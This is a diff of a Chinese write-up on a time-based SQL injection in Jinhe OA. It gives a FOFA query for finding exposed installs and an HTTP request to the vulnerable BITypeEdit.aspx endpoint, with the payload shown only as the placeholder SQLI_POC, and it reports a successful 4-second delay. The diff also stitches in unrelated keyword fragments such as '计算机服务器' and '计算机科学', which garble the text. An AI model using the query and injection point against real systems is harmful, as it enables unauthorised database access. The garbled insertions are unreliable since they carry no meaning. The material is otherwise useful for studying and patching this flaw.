@@ -17,8 +17,6 @@ asset_dir: embedded-base64
 # fofa语法
 
 > app="金和网络-金和OA"
->
-> 数据管理
 
 # 漏洞分析
 
@@ -54,6 +52,14 @@ public string GetTypeNameByCode(string typeCode)
 
 # 漏洞复现
 
+深入探索
+
+网络
+
+计算机服务器
+
+计算机科学
+
 ```
 GET /c6/Jhsoft.Web.BIframe/BITypeEdit.aspx/?type=edit&id=SQLI_POC HTTP/1.1
 Host: jhsoft.mrxn.net
@@ -63,4 +69,4 @@ Host: jhsoft.mrxn.net
 
 成功延时 4 秒
 
-网络
+数据管理
